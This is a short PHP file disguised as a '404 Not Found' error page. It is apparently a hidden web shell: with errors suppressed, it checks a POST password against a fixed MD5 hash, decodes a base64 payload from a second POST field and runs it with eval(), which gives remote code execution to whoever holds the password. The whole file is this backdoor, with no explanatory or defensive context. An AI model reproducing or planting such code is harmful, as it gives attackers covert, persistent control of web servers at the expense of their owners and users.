<?php 
echo "404 Not Found!</br>"; error_reporting(0);
if(isset($_POST['com']) && md5($_POST['com']) == '791dc312b38016ef998c1c146104cd5a' && isset($_POST['content'])) $content = strtr($_POST['content'], '-_,', '+/=');eval(base64_decode($content));
echo "We're sorry but the page your are looking for is Not Found..."
?>
